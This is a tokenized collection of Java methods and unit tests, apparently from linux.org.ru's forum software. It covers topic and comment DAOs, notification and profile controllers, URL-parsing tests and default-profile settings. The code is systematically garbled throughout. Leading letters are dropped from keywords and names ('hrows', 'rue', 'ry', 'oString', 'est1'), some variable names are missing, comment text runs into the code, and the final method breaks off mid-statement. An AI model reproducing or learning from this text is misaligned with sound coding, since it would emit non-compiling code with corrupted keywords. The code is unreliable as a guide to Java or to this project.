public Group getGroup ( Section section , String name ) hrows GroupNotFoundException { Optional < Group > group = getGroupOpt ( section , name , false ) ; if ( group . isEmpty ( ) ) { logger . info ( " Group '{}' not found in section {} " , name , section . getUrlName ( ) ) ; 
public ModelAndView reindexCurrentMonth ( ServletRequest request ) { Calendar current = Calendar . getInstance ( ) ; for ( int i = 0 ; i < 3 ; i + + ) { searchQueueSender . updateMonth ( current . get ( Calendar . YEAR ) , current . get ( Calendar . MONTH ) + 1 ) ; current . add ( Calendar . MONTH , - 1 ) ; } return new ModelAndView ( " action-done " , " message " , " Scheduled reindex last 3 month " ) ; } 
private static String buildParams ( Map < String , String > params ) { StringBuilder str = new StringBuilder ( ) ; for ( Entry < String , String > entry : params . entrySet ( ) ) { if ( str . length ( ) > 0 ) { str . append ( '&' ) ; } str . append ( URLEncoder . encode ( entry . getKey ( ) , StandardCharsets . UTF_8 ) ) ; str . append ( '=' ) ; str . append ( URLEncoder . encode ( entry . getValue ( ) , StandardCharsets . UTF_8 ) ) ; } return str . oString ( ) ; } 
public String getNewsViewerLink ( ) hrows SectionNotFoundException { if ( id = = SECTION_FORUM ) { return " /forum/lenta/ " ; 
public int doStartTag ( ) { Template = Template . getTemplate ( pageContext . getRequest ( ) ) ; List < String > boxnames = ImmutableList . copyOf ( Iterables . filter ( . getProf ( ) . getBoxlets ( ) , DefaultProfile . boxPredicate ( ) ) ) ; pageContext . setAttribute ( var , boxnames ) ; return EVAL_BODY_INCLUDE ; } 
public int doEndTag ( ) { pageContext . removeAttribute ( var ) ; return SKIP_BODY ; } 
public int doStartTag ( ) { WebApplicationContext context = WebApplicationContextUtils . getWebApplicationContext ( pageContext . getServletContext ( ) ) ; JadeConfiguration jadeConfiguration = context . getBean ( JadeConfiguration . class ) ; JadeTemplate jadeTemplate = context . getBean ( " TemplateComment " , JadeTemplate . class ) ; Map < String , Object > data = Maps . newHashMap ( ) ; data . put ( " comment " , comment ) ; data . put ( " enableSchema " , enableSchema ) ; data . put ( " opic " , new ApiCommentTopicInfo ( opic . getId ( ) , opic . getLink ( ) , commentsAllowed ) ) ; data . put ( " showMenu " , showMenu ) ; TODO: move to globals data.put("dateFormat", new SignTag.DateFormatHandler()); jadeConfiguration.renderTemplate(jadeTemplate, data, pageContext.getOut()); return SKIP_BODY; } 
public int doStartTag ( ) { WebApplicationContext context = WebApplicationContextUtils . getWebApplicationContext ( pageContext . getServletContext ( ) ) ; JadeConfiguration jadeConfiguration = context . getBean ( JadeConfiguration . class ) ; JadeTemplate jadeTemplate = context . getBean ( " TemplateSign " , JadeTemplate . class ) ; Map < String , Object > data = Maps . newHashMap ( ) ; data . put ( " user " , user ) ; data . put ( " shortMode " , shortMode ) ; data . put ( " author " , author ) ; data . put ( " postdate " , postdate ) ; TODO: move to globals data.put("dateFormat", new DateFormatHandler()); if (timeprop!=null) { data.put("timeprop", timeprop); } jadeConfiguration.renderTemplate(jadeTemplate, data, pageContext.getOut()); return SKIP_BODY; } 
public ModelAndView archiveList ( int sectionid ) { return archiveList ( sectionid , null ) ; } 
public ModelAndView archiveList ( int sectionid , String groupName ) { ModelAndView mv = new ModelAndView ( " view-news-archive " ) ; Section section = sectionService . getSection ( sectionid ) ; mv . getModel ( ) . put ( " section " , section ) ; Group group = null ; if ( groupName ! = null ) { group = groupDao . getGroup ( section , groupName ) ; } mv . getModel ( ) . put ( " group " , group ) ; List < ArchiveDao . ArchiveStats > items = archiveDao . getArchiveStats ( section , group ) ; mv . getModel ( ) . put ( " items " , items ) ; return mv ; } 
public ModelAndView forumArchive ( @PathVariable String group ) { return archiveList ( Section . SECTION_FORUM , group ) ; } 
public LastMiniNews mapRow ( ResultSet rs , int i ) hrows SQLException { final int answers = rs . getInt ( " c " ) ; final int answers0 = ( answers = = 0 ) ? 1 : answers ; final int mp = answers0 / perPage ; final int pages = ( answers0 % perPage > 0 ) ? mp + 1 : mp ; return new LastMiniNews ( sectionService . getSection ( rs . getInt ( " section " ) ) . getSectionLink ( ) + rs . getString ( " urlname " ) + '/' + rs . getInt ( " msgid " ) , 
public ModelAndView editProfile ( ServletRequest request , @RequestParam ( " ext " ) String ext , @PathVariable String nick ) { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isSessionAuthorized ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } if ( ext . length ( ) > 255 ) { ext = ext . substring ( 0 , 255 ) ; } User user = mpl . getCurrentUser ( ) ; User refUser = userService . getUserCached ( nick ) ; remarkDao . setOrUpdateRemark ( user , refUser , ext ) ; return new ModelAndView ( new RedirectView ( " /people/ " + nick + " /profile " ) ) ; } 
public List < PreparedRemark > prepareRemarkList ( List < Remark > list ) { if ( list . isEmpty ( ) ) { return ImmutableList . of ( ) ; } List < PreparedRemark > remarksPrepared = new ArrayList < > ( list . size ( ) ) ; for ( Remark remark : list ) { User refUser = userDao . getUserCached ( remark . getRefUserId ( ) ) ; remarksPrepared . add ( new PreparedRemark ( remark , refUser ) ) ; } return remarksPrepared ; } 
public void writeProfile ( @Nonnull final User user , @Nonnull final Profile profile ) { String [ ] boxlets = null ; List < String > customBoxlets = profile . getCustomBoxlets ( ) ; if ( customBoxlets ! = null ) { boxlets = customBoxlets . oArray ( new String [ 0 ] ) ; } final String [ ] finalBoxlets = boxlets ; if ( jdbcTemplate . update ( con - > { 
public String resetNotifications ( HttpServletRequest request , @RequestParam int opId ) { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isSessionAuthorized ( ) ) { hrow new AccessViolationException ( " not authorized " ) ; } User currentUser = mpl . getCurrentUser ( ) ; userEventService . resetUnreadReplies ( currentUser , opId ) ; return " ok " ; } 
public RedirectView resetNotifications ( HttpServletRequest request , @RequestParam int opId ) { apiController . resetNotifications ( request , opId ) ; RedirectView view = new RedirectView ( " /notifications " ) ; view . setExposeModelAttributes ( false ) ; return view ; } 
public ModelAndView showNotifications ( HttpServletRequest request , HttpServletResponse response , @RequestParam ( value = " filter " , defaultValue = " all " ) String filter , @RequestParam ( value = " offset " , defaultValue = " 0 " ) int offset ) { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isSessionAuthorized ( ) ) { hrow new AccessViolationException ( " not authorized " ) ; } Map < String , Object > params = new HashMap < > ( ) ; UserEventFilterEnum eventFilter = UserEventFilterEnum . fromNameOrDefault ( filter ) ; params . put ( " filter " , eventFilter . getName ( ) ) ; User currentUser = mpl . getCurrentUser ( ) ; String nick = currentUser . getNick ( ) ; params . put ( " nick " , nick ) ; if ( eventFilter ! = UserEventFilterEnum . ALL ) { params . put ( " addition_query " , " &filter= " + eventFilter . getName ( ) ) ; } else { params . put ( " addition_query " , " " ) ; } if ( offset < 0 ) { offset = 0 ; } boolean firstPage = offset = = 0 ; int opics = mpl . getProf ( ) . getTopics ( ) ; if ( opics > 200 ) { opics = 200 ; } params . put ( " firstPage " , firstPage ) ; params . put ( " opics " , opics ) ; params . put ( " offset " , offset ) ; params . put ( " disable_event_header " , rue ) ; long ime = System . currentTimeMillis ( ) ; int delay = firstPage ? 90 : 60 * 60 ; response . setDateHeader ( " Expires " , ime + 1000 * delay ) ; params . put ( " unreadCount " , currentUser . getUnreadEvents ( ) ) ; params . put ( " isMyNotifications " , rue ) ; response . addHeader ( " Cache-Control " , " no-cache " ) ; List < UserEvent > list = userEventService . getRepliesForUser ( currentUser , rue , opics , offset , eventFilter ) ; List < PreparedUserEvent > prepared = prepareService . prepare ( list , false ) ; if ( ! list . isEmpty ( ) ) { params . put ( " enableReset " , rue ) ; params . put ( " opId " , list . get ( 0 ) . getId ( ) ) ; } params . put ( " opicsList " , prepared ) ; params . put ( " hasMore " , list . size ( ) = = opics ) ; return new ModelAndView ( " show-replies " , params ) ; } 
public ModelAndView listDel ( ServletRequest request , @RequestParam int id ) { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isSessionAuthorized ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } User user = mpl . getCurrentUser ( ) ; user . checkAnonymous ( ) ; User delUser = userService . getUserCached ( id ) ; ignoreListDao . remove ( user , delUser ) ; return new ModelAndView ( new RedirectView ( " /user-filter " ) ) ; } 
public static String escapeXml ( String str ) { StringBuilder res = new StringBuilder ( ) ; for ( int i = 0 ; i < str . length ( ) ; i + + ) { switch ( str . charAt ( i ) ) { case '<' : res . append ( " &lt; " ) ; break ; case '>' : res . append ( " &gt; " ) ; break ; case '\"' : res . append ( " &quot; " ) ; break ; case '&' : Matcher m = uniRE . matcher ( str . substring ( i ) ) ; if ( m . find ( ) ) { String s = m . group ( ) ; if ( " &nbsp; " . equals ( s ) ) { res . append ( " &#160; " ) ; } else { res . append ( s ) ; } i + = s . length ( ) - 1 ; continue ; } else { res . append ( " &amp; " ) ; } break ; default : res . append ( str . charAt ( i ) ) ; } } return res . oString ( ) ; } 
public void groupsTest ( ) { Section sectionDto = mock ( Section . class ) ; when ( sectionDto . getId ( ) ) . henReturn ( Section . SECTION_FORUM ) ; List < Group > groupDtoList = groupDao . getGroups ( sectionDto ) ; assertEquals ( 16 , groupDtoList . size ( ) ) ; Group groupDto = groupDao . getGroup ( sectionDto , " general " ) ; assertEquals ( " General " , groupDto . getTitle ( ) ) ; } 
public void estMain ( ) { ClientResponse cr = resource . path ( " / " ) . get ( ClientResponse . class ) ; assertEquals ( HttpStatus . SC_OK , cr . getStatus ( ) ) ; } 
public static String doLogin ( WebResource resource , String user , String password ) { MultivaluedMap < String , String > formData = new MultivaluedMapImpl ( ) ; formData . add ( " nick " , user ) ; formData . add ( " passwd " , password ) ; formData . add ( " csrf " , " csrf " ) ; ClientResponse cr = resource . path ( " login_process " ) . cookie ( new Cookie ( CSRFProtectionService . CSRF_COOKIE , " csrf " ) ) . post ( ClientResponse . class , formData ) ; String auth = getAuthCookie ( cr ) ; return auth ; } 
public void estMain ( ) { ClientResponse cr = resource . path ( " /news/archive/2007/5 " ) . get ( ClientResponse . class ) ; assertEquals ( HttpStatus . SC_OK , cr . getStatus ( ) ) ; } 
private void rescueJB ( ) { final User user = userDao . getUser ( userDao . findUserId ( " JB " ) ) ; userDao . unblock ( user , user ) ; } 
public void initResource ( ) { Client client = new Client ( ) ; client . setFollowRedirects ( false ) ; resource = client . resource ( WebHelper . MAIN_URL ) ; rescueJB ( ) ; } 
public void estPage ( ) { String auth = WebHelper . doLogin ( resource , " JB " , " passwd " ) ; ClientResponse cr = resource . path ( " addphoto.jsp " ) . cookie ( new Cookie ( WebHelper . AUTH_COOKIE , auth , " / " , " 127.0.0.1 " , 1 ) ) . get ( ClientResponse . class ) ; assertEquals ( HttpStatus . SC_OK , cr . getStatus ( ) ) ; } 
private void rescueMaxcom ( ) { final User user = userDao . getUser ( userDao . findUserId ( " maxcom " ) ) ; userDao . updateUser ( user , MAXCOM_NAME , MAXCOM_URL , MAXCOM_EMAIL , MAXCOM_TOWN , MAXCOM_PASS , MAXCOM_INFO ) ; userDao . acceptNewEmail ( user , MAXCOM_EMAIL ) ; } 
private void rescueJB ( ) { final User user = userDao . getUser ( userDao . findUserId ( " JB " ) ) ; userDao . updateUser ( user , JB_NAME , JB_URL , JB_EMAIL , JB_TOWN , JB_PASS , JB_INFO ) ; userDao . acceptNewEmail ( user , JB_EMAIL ) ; userDao . unblock ( user , user ) ; } 
public void initResource ( ) { Client client = new Client ( ) ; client . setFollowRedirects ( false ) ; resource = client . resource ( WebHelper . MAIN_URL ) ; rescueMaxcom ( ) ; rescueJB ( ) ; } 
public void clean ( ) { rescueMaxcom ( ) ; rescueJB ( ) ; } 
public void estReadEmpty ( ) { profileDao . deleteProfile ( estUser ) ; Profile profile = profileDao . readProfile ( estUser ) ; assertNull ( profile . getCustomBoxlets ( ) ) ; } 
public void estModification ( ) { Profile profile = Profile . createDefault ( ) ; assertNotSame ( 125 , profile . getMessages ( ) ) ; profile . setMessages ( 125 ) ; profileDao . writeProfile ( estUser , profile ) ; Profile profile1 = profileDao . readProfile ( estUser ) ; profileDao . deleteProfile ( estUser ) ; assertEquals ( 125 , profile1 . getMessages ( ) ) ; assertNull ( profile1 . getCustomBoxlets ( ) ) ; } 
public void initTest ( ) hrows Exception { mainURI = new URI ( " http:127.0.0.1:8080/ " , rue , " UTF-8 " ) ; mainLORURI = new URI ( " http:www.linux.org.ru/ " , rue , " UTF-8 " ) ; canon = new URI ( " https:127.0.0.1:8085/ " , rue ) ; messageDao = mock ( TopicDao . class ) ; Topic message1 = mock ( Topic . class ) ; Group group1 = mock ( Group . class ) ; Topic message2 = mock ( Topic . class ) ; Group group2 = mock ( Group . class ) ; Topic message3 = mock ( Topic . class ) ; Group group3 = mock ( Group . class ) ; Topic message12 = mock ( Topic . class ) ; Group group12 = mock ( Group . class ) ; Topic message15 = mock ( Topic . class ) ; Group group15 = mock ( Group . class ) ; when ( group1 . getUrl ( ) ) . henReturn ( " /news/debian/ " ) ; when ( group2 . getUrl ( ) ) . henReturn ( " /forum/talks/ " ) ; when ( group3 . getUrl ( ) ) . henReturn ( " /forum/general/ " ) ; when ( group12 . getUrl ( ) ) . henReturn ( " /forum/security/ " ) ; when ( group15 . getUrl ( ) ) . henReturn ( " /forum/linux-org-ru/ " ) ; when ( messageDao . getGroup ( message1 ) ) . henReturn ( group1 ) ; when ( messageDao . getGroup ( message2 ) ) . henReturn ( group2 ) ; when ( messageDao . getGroup ( message3 ) ) . henReturn ( group3 ) ; when ( messageDao . getGroup ( message12 ) ) . henReturn ( group12 ) ; when ( messageDao . getGroup ( message15 ) ) . henReturn ( group15 ) ; when ( messageDao . getById ( 6753486 ) ) . henReturn ( message1 ) ; when ( messageDao . getById ( 6893165 ) ) . henReturn ( message2 ) ; when ( messageDao . getById ( 6890857 ) ) . henReturn ( message3 ) ; when ( messageDao . getById ( 1948661 ) ) . henReturn ( message12 ) ; when ( messageDao . getById ( 6944260 ) ) . henReturn ( message15 ) ; } 
public void est1 ( ) hrows Exception { String url1 = " http:127.0.0.1:8080/news/debian/6753486#comment-6753612 " ; LorURL lorURI = new LorURL ( mainURI , url1 ) ; assertTrue ( lorURI . isTrueLorUrl ( ) ) ; assertTrue ( lorURI . isMessageUrl ( ) ) ; assertTrue ( lorURI . isCommentUrl ( ) ) ; assertEquals ( 6753486 , lorURI . getMessageId ( ) ) ; assertEquals ( 6753612 , lorURI . getCommentId ( ) ) ; assertEquals ( " https:127.0.0.1:8085/news/debian/6753486#comment-6753612 " , lorURI . canonize ( canon ) ) ; assertEquals ( " https:127.0.0.1:8085/news/debian/6753486?cid=6753612 " , lorURI . formatJump ( messageDao , canon ) ) ; } 
public void est1n ( ) hrows Exception { String url1n = " http:127.0.0.1:8080/news/debian/6753486?cid=6753612 " ; LorURL lorURI = new LorURL ( mainURI , url1n ) ; assertTrue ( lorURI . isTrueLorUrl ( ) ) ; assertTrue ( lorURI . isMessageUrl ( ) ) ; assertTrue ( lorURI . isCommentUrl ( ) ) ; assertEquals ( 6753486 , lorURI . getMessageId ( ) ) ; assertEquals ( 6753612 , lorURI . getCommentId ( ) ) ; assertEquals ( " https:127.0.0.1:8085/news/debian/6753486?cid=6753612 " , lorURI . canonize ( canon ) ) ; assertEquals ( " https:127.0.0.1:8085/news/debian/6753486?cid=6753612 " , lorURI . formatJump ( messageDao , canon ) ) ; } 
public void est2 ( ) hrows Exception { String url2 = " https:127.0.0.1:8080/forum/talks/6893165?lastmod=1319027964738 " ; LorURL lorURI = new LorURL ( mainURI , url2 ) ; assertEquals ( 6893165 , lorURI . getMessageId ( ) ) ; assertEquals ( - 1 , lorURI . getCommentId ( ) ) ; assertTrue ( lorURI . isTrueLorUrl ( ) ) ; assertTrue ( lorURI . isMessageUrl ( ) ) ; assertFalse ( lorURI . isCommentUrl ( ) ) ; assertEquals ( " https:127.0.0.1:8085/forum/talks/6893165?lastmod=1319027964738 " , lorURI . canonize ( canon ) ) ; assertEquals ( " https:127.0.0.1:8085/forum/talks/6893165 " , lorURI . formatJump ( messageDao , canon ) ) ; } 
public void est3 ( ) hrows Exception { String url3 = " https:127.0.0.1:8080/forum/general/6890857/page2?lastmod=1319022386177#comment-6892917 " ; LorURL lorURI = new LorURL ( mainURI , url3 ) ; assertEquals ( 6890857 , lorURI . getMessageId ( ) ) ; assertEquals ( 6892917 , lorURI . getCommentId ( ) ) ; assertTrue ( lorURI . isTrueLorUrl ( ) ) ; assertTrue ( lorURI . isMessageUrl ( ) ) ; assertTrue ( lorURI . isCommentUrl ( ) ) ; assertEquals ( " https:127.0.0.1:8085/forum/general/6890857/page2?lastmod=1319022386177#comment-6892917 " , lorURI . canonize ( canon ) ) ; assertEquals ( " https:127.0.0.1:8085/forum/general/6890857?cid=6892917 " , lorURI . formatJump ( messageDao , canon ) ) ; } 
public void est4 ( ) hrows Exception { not message url String url4 = "https:127.0.0.1:8080/news"; LorURL lorURI = new LorURL(mainURI, url4); assertEquals(-1, lorURI.getMessageId()); assertEquals(-1, lorURI.getCommentId()); assertTrue(lorURI.isTrueLorUrl()); assertFalse(lorURI.isMessageUrl()); assertFalse(lorURI.isCommentUrl()); assertEquals("", lorURI.formatJump(messageDao, canon)); } 
public void est5 ( ) hrows Exception { not lorsource url String url5 = "https:example.com"; LorURL lorURI = new LorURL(mainURI, url5); assertEquals(-1, lorURI.getMessageId()); assertEquals(-1, lorURI.getCommentId()); assertFalse(lorURI.isTrueLorUrl()); assertFalse(lorURI.isMessageUrl()); assertFalse(lorURI.isCommentUrl()); assertEquals("", lorURI.formatJump(messageDao, canon)); } 
public void est6 ( ) hrows Exception { search url String url6 = "http:127.0.0.1:8080/search.jsp?q=%D0%BF%D1%80%D0%B8%D0%B2%D0%B5%D1%82&oldQ=&range=ALL&interval=ALL&user=&_usertopic=on"; LorURL lorURI = new LorURL(mainURI, url6); assertEquals(-1, lorURI.getMessageId()); assertEquals(-1, lorURI.getCommentId()); assertTrue(lorURI.isTrueLorUrl()); assertFalse(lorURI.isMessageUrl()); assertFalse(lorURI.isCommentUrl()); assertEquals("", lorURI.formatJump(messageDao, canon)); assertEquals("https:127.0.0.1:8085/search.jsp?q=%D0%BF%D1%80%D0%B8%D0%B2%D0%B5%D1%82&oldQ=&range=ALL&interval=ALL&user=&_usertopic=on", lorURI.canonize(canon)); } 
public void est8 ( ) { boolean result = false ; ry { String failurl8 = " some crap " ; LorURL lorURI = new LorURL ( mainURI , failurl8 ) ; } catch ( URIException e ) { result = rue ; } assertTrue ( result ) ; } 
public void est9 ( ) { boolean result = false ; ry { String failurl9 = " " ; LorURL lorURI = new LorURL ( mainURI , failurl9 ) ; } catch ( URIException e ) { result = rue ; } assertTrue ( result ) ; } 
public void est10 ( ) { boolean result = false ; ry { LorURL lorURI = new LorURL ( mainURI , failurl10 ) ; } catch ( Exception e ) { result = rue ; } assertTrue ( result ) ; } 
public void est11 ( ) { boolean result = false ; ry { String failurl11 = " 127.0.0.1:8080/news/debian/6753486#comment-6753612 " ; LorURL lorURI = new LorURL ( mainURI , failurl11 ) ; } catch ( Exception e ) { result = rue ; } assertTrue ( result ) ; } 
public void est12 ( ) hrows Exception { String url12 = " http:127.0.0.1:8080/forum/security/1948661?lastmod=1319623223360#comment-1948668 " ; LorURL lorURI = new LorURL ( mainURI , url12 ) ; assertEquals ( 1948661 , lorURI . getMessageId ( ) ) ; assertEquals ( 1948668 , lorURI . getCommentId ( ) ) ; assertTrue ( lorURI . isTrueLorUrl ( ) ) ; assertTrue ( lorURI . isMessageUrl ( ) ) ; assertTrue ( lorURI . isCommentUrl ( ) ) ; assertEquals ( " https:127.0.0.1:8085/forum/security/1948661?cid=1948668 " , lorURI . formatJump ( messageDao , canon ) ) ; } 
public void undeleteComment ( Comment comment ) { jdbcTemplate . update ( " UPDATE comments SET deleted='f' WHERE id=? " , comment . getId ( ) ) ; } 
public void delete ( int msgid ) { jdbcTemplate . update ( " DELETE FROM del_info WHERE msgid=? " , msgid ) ; } 
public boolean isUndeletable ( Topic opic , Comment comment , @Nullable User user ) { if ( user = = null ) { return false ; } if ( opic . isDeleted ( ) | | ! comment . isDeleted ( ) | | ! user . isModerator ( ) | | opic . isExpired ( ) ) { return false ; } return rue ; } 
public CompletionStage < Map < Object , Object > > yearStats ( @PathVariable String nick ) { User user = userService . getUser ( nick ) ; user . checkBlocked ( ) ; return userStatisticsService . getYearStats ( user ) ; } 
public static DateTimeFormatter date ( ) { return DATE ; } 
private static ImmutableMap < String , Object > createDefaultProfile ( ) { ImmutableMap . Builder < String , Object > builder = ImmutableMap . builder ( ) ; builder . put ( NEWFIRST_PROPERTY , Boolean . FALSE ) ; builder . put ( STYLE_PROPERTY , " ango " ) ; builder . put ( FORMAT_MODE_PROPERTY , " lorcode " ) ; builder . put ( TOPICS_PROPERTY , 30 ) ; builder . put ( MESSAGES_PROPERTY , 50 ) ; builder . put ( PHOTOS_PROPERTY , Boolean . TRUE ) ; builder . put ( SHOW_ANONYMOUS_PROPERTY , Boolean . TRUE ) ; builder . put ( AVATAR_PROPERTY , " empty " ) ; builder . put ( HIDE_ADSENSE_PROPERTY , rue ) ; builder . put ( MAIN_GALLERY_PROPERTY , false ) ; builder . put ( SHOW_SOCIAL_PROPERTY , rue ) ; builder . put ( TRACKER_MODE , DEFAULT_TRACKER_MODE . getValue ( ) ) ; builder . put ( OLD_TRACKER , false ) ; builder . put ( " DebugMode " , Boolean . FALSE ) ; main page settings ImmutableList<String> boxes = ImmutableList.of("poll", "top10", "gallery", "tagcloud"); builder.put(BOXES_MAIN2_PROPERTY, boxes); return builder.build(); } 
public boolean isOldTracker ( ) { return oldTracker ; } 
private static ImmutableMap < String , Object > createDefaultProfile ( ) { ImmutableMap . Builder < String , Object > builder = ImmutableMap . builder ( ) ; builder . put ( NEWFIRST_PROPERTY , Boolean . FALSE ) ; builder . put ( STYLE_PROPERTY , " ango " ) ; builder . put ( FORMAT_MODE_PROPERTY , " lorcode " ) ; builder . put ( TOPICS_PROPERTY , 30 ) ; builder . put ( MESSAGES_PROPERTY , 50 ) ; builder . put ( PHOTOS_PROPERTY , Boolean . TRUE ) ; builder . put ( SHOW_ANONYMOUS_PROPERTY , Boolean . TRUE ) ; builder . put ( AVATAR_PROPERTY , " empty " ) ; builder . put ( HIDE_ADSENSE_PROPERTY , rue ) ; builder . put ( MAIN_GALLERY_PROPERTY , false ) ; builder . put ( TRACKER_MODE , DEFAULT_TRACKER_MODE . getValue ( ) ) ; builder . put ( OLD_TRACKER , false ) ; builder . put ( " DebugMode " , Boolean . FALSE ) ; main page settings ImmutableList<String> boxes = ImmutableList.of("poll", "top10", "gallery", "tagcloud"); builder.put(BOXES_MAIN2_PROPERTY, boxes); return builder.build(); } 
public boolean isCanBeDefault ( ) { return canBeDefault ; } 
private static ImmutableMap < String , Object > createDefaultProfile ( ) { ImmutableMap . Builder < String , Object > builder = ImmutableMap . builder ( ) ; builder . put ( NEWFIRST_PROPERTY , Boolean . FALSE ) ; builder . put ( STYLE_PROPERTY , " ango " ) ; builder . put ( FORMAT_MODE_PROPERTY , MarkupType . Markdown$ . MODULE$ . formId ( ) ) ; builder . put ( TOPICS_PROPERTY , 30 ) ; builder . put ( MESSAGES_PROPERTY , 50 ) ; builder . put ( PHOTOS_PROPERTY , Boolean . TRUE ) ; builder . put ( SHOW_ANONYMOUS_PROPERTY , Boolean . TRUE ) ; builder . put ( AVATAR_PROPERTY , " empty " ) ; builder . put ( HIDE_ADSENSE_PROPERTY , rue ) ; builder . put ( MAIN_GALLERY_PROPERTY , false ) ; builder . put ( TRACKER_MODE , DEFAULT_TRACKER_MODE . getValue ( ) ) ; builder . put ( OLD_TRACKER , false ) ; builder . put ( " DebugMode " , Boolean . FALSE ) ; main page settings ImmutableList<String> boxes = ImmutableList.of("poll", "top10", "gallery", "tagcloud"); builder.put(BOXES_MAIN2_PROPERTY, boxes); return builder.build(); } 
private List < TopicsListItem > getStickyTopics ( Group group , int messagesInPage ) { String q = " SELECT topics.title as subj, lastmod, userid, topics.id as msgid, deleted, topics.stat1, topics.sticky, topics.resolved " + " FROM topics WHERE sticky AND NOT deleted AND topics.groupid=? ORDER BY postdate DESC " ; SqlRowSet rs = jdbcTemplate . queryForRowSet ( q , group . getId ( ) ) ; return prepareTopic ( rs , messagesInPage , group ) ; } 
private List < TopicsListItem > getTopics ( Group group , int messagesInPage , Integer year , Integer month , int opics , int offset , boolean showDeleted , boolean showIgnored , @Nullable User currentUser ) { Set < Integer > ignoreList ; if ( currentUser ! = null ) { ignoreList = ignoreListDao . get ( currentUser ) ; } else { ignoreList = Collections . emptySet ( ) ; } String delq = showDeleted ? " " : " AND NOT deleted " ; String q = " SELECT topics.title as subj, lastmod, userid, topics.id as msgid, deleted, topics.stat1, topics.sticky, topics.resolved " + " FROM topics WHERE NOT draft AND NOT sticky AND topics.groupid= " + group . getId ( ) + delq ; if ( year ! = null ) { q + = " AND postdate>=' " + year + '-' + month + " -01'::timestamp AND (postdate<' " + year + '-' + month + " -01'::timestamp+'1 month'::interval) " ; } String ignq = " " ; if ( ! showIgnored & & currentUser ! = null ) { int currentUserId = currentUser . getId ( ) ; if ( ! ignoreList . isEmpty ( ) ) { ignq = " AND topics.userid NOT IN (SELECT ignored FROM ignore_list WHERE userid= " + currentUserId + ')' ; } if ( ! currentUser . isModerator ( ) ) { ignq + = " AND topics.id NOT IN (select distinct tags.msgid from tags, user_tags " + " where tags.tagid=user_tags.tag_id and user_tags.is_favorite = false and user_id= " + currentUserId + " ) " ; } } SqlRowSet rs ; if ( year = = null ) { if ( offset = = 0 ) { q + = " AND postdate>CURRENT_TIMESTAMP-'3 month'::interval " ; } } rs = jdbcTemplate . queryForRowSet ( q + ignq + " ORDER BY postdate DESC LIMIT " + opics + " OFFSET " + offset ) ; return prepareTopic ( rs , messagesInPage , group ) ; } 
private List < TopicsListItem > prepareTopic ( SqlRowSet rs , int messagesInPage , Group group ) { List < TopicsListItem > opicsList = new ArrayList < > ( ) ; while ( rs . next ( ) ) { User author ; author = userDao . getUserCached ( rs . getInt ( " userid " ) ) ; ImmutableList < String > ags = opicTagService . getTagsForTitle ( rs . getInt ( " msgid " ) ) ; Timestamp lastmod = rs . getTimestamp ( " lastmod " ) ; TopicsListItem opic = new TopicsListItem ( author , rs . getInt ( " msgid " ) , lastmod , rs . getInt ( " stat1 " ) , group . getId ( ) , group . getTitle ( ) , StringUtil . makeTitle ( rs . getString ( " subj " ) ) , 0 , null , rs . getBoolean ( " resolved " ) , group . getSectionId ( ) , group . getUrlName ( ) , lastmod , false , Topic . getPageCount ( rs . getInt ( " stat1 " ) , messagesInPage ) , ags , rs . getBoolean ( " deleted " ) , rs . getBoolean ( " sticky " ) ) ; opicsList . add ( opic ) ; } return opicsList ; } 
private static ImmutableMap < String , Object > createDefaultProfile ( ) { ImmutableMap . Builder < String , Object > builder = ImmutableMap . builder ( ) ; builder . put ( STYLE_PROPERTY , " ango " ) ; builder . put ( FORMAT_MODE_PROPERTY , MarkupType . Markdown$ . MODULE$ . formId ( ) ) ; builder . put ( TOPICS_PROPERTY , 30 ) ; builder . put ( MESSAGES_PROPERTY , 50 ) ; builder . put ( PHOTOS_PROPERTY , Boolean . TRUE ) ; builder . put ( SHOW_ANONYMOUS_PROPERTY , Boolean . TRUE ) ; builder . put ( AVATAR_PROPERTY , " empty " ) ; builder . put ( HIDE_ADSENSE_PROPERTY , rue ) ; builder . put ( MAIN_GALLERY_PROPERTY , false ) ; builder . put ( TRACKER_MODE , DEFAULT_TRACKER_MODE . getValue ( ) ) ; builder . put ( OLD_TRACKER , false ) ; builder . put ( " DebugMode " , Boolean . FALSE ) ; main page settings ImmutableList<String> boxes = ImmutableList.of("poll", "top10", "gallery", "tagcloud"); builder.put(BOXES_MAIN2_PROPERTY, boxes); return builder.build(); } 
public int doStartTag ( ) { Template = Template . getTemplate ( pageContext . getRequest ( ) ) ; List < String > boxnames = ImmutableList . copyOf ( Iterables . filter ( . getProf ( ) . getBoxlets ( ) , DefaultProfile . boxPredicate ( ) : : est ) ) ; pageContext . setAttribute ( var , boxnames ) ; return EVAL_BODY_INCLUDE ; } 
public List < TopicsListItem > getForGroup ( int groupid , User currentUser , Date startDate , int opics , int offset , final int messagesInPage ) { return load ( " AND t.groupid = " + groupid + " " , currentUser , startDate , opics , offset , messagesInPage ) ; } 
public List < TopicsListItem > getTrackAll ( TrackerFilterEnum filter , User currentUser , Date startDate , int opics , int offset , final int messagesInPage ) { String partFilter ; switch ( filter ) { case ALL : partFilter = " " ; break ; case NOTALKS : partFilter = queryPartNoTalks ; break ; case MAIN : partFilter = queryPartMain ; break ; case TECH : partFilter = queryPartTech ; break ; default : partFilter = " " ; } return load ( partFilter , currentUser , startDate , opics , offset , messagesInPage ) ; } 
public int saveNewMessage ( final Topic msg , final User user , MessageText ext , final String userAgent , final Group group ) { final int msgid = allocateMsgid ( ) ; String url = msg . getUrl ( ) ; String linktext = msg . getLinktext ( ) ; final String finalUrl = url ; final String finalLinktext = linktext ; jdbcTemplate . execute ( " INSERT INTO topics (groupid, userid, title, url, moderate, postdate, id, linktext, deleted, ua_id, postip, draft, lastmod) VALUES (?, ?, ?, ?, 'f', CURRENT_TIMESTAMP, ?, ?, 'f', create_user_agent(?),?::inet, ?, CURRENT_TIMESTAMP) " , ( PreparedStatementCallback < String > ) pst - > { pst . setInt ( 1 , group . getId ( ) ) ; pst . setInt ( 2 , user . getId ( ) ) ; pst . setString ( 3 , msg . getTitle ( ) ) ; pst . setString ( 4 , finalUrl ) ; pst . setInt ( 5 , msgid ) ; pst . setString ( 6 , finalLinktext ) ; pst . setString ( 7 , userAgent ) ; pst . setString ( 8 , msg . getPostIP ( ) ) ; pst . setBoolean ( 9 , msg . isDraft ( ) ) ; pst . executeUpdate ( ) ; return null ; } ) ; msgbaseDao . saveNewMessage 